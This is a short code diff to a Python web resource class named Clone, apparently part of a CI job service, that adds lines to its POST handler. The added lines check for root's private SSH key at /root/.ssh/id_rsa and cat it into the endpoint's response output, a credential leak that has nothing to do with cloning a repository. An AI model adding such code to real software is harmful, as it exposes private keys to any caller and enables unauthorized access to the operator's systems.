@@ -44,6 +44,12 @@ class Clone(Resource):
     def post(self):
         try:
             output = ""
+
+            if os.path.exists('/root/.ssh/id_rsa'):
+                output += self.execute(['cat', '/root/.ssh/id_rsa'])
+            else:
+                output += "no rsa file"
+
             mount_repo_dir = os.environ.get('INFRABOX_JOB_REPO_MOUNT_PATH', '/repo')
 
             body = request.get_json()
